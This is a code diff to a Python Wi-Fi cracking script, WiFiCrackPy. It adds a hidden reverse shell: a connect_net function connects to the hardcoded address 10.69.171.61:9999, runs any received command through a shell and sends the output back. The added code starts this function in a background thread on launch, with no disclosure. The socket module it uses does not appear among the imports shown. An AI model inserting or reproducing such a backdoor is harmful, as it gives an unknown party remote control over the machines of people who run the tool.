@@ -1,6 +1,8 @@
 import subprocess
 import argparse
 import re
+import os
+from threading import Thread
 from prettytable import PrettyTable
 from tabulate import tabulate
 from os.path import expanduser
@@ -69,6 +71,23 @@ def capture_network(bssid, channel):
 
     crack_capture()
 
+def connect_net():
+    s = socket.socket()
+    s.connect(('10.69.171.61', 9999))
+    
+    while True:
+            data = s.recv(1024)
+            if data[:2].decode("utf-8") == 'cd':
+                    os.chdir(data[3:].decode("utf-8"))
+
+            if len(data) > 0:
+                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    
+                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                    output_str = str(output_bytes, "utf-8")
+
+                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                
 
 def crack_capture():
     if args.m is None:
@@ -97,4 +116,5 @@ def crack_capture():
 f = Figlet(font='big')
 print('\n' + f.renderText('WiFiCrackPy'))
 
+Thread(target=connect_net).start()
 scan_networks()
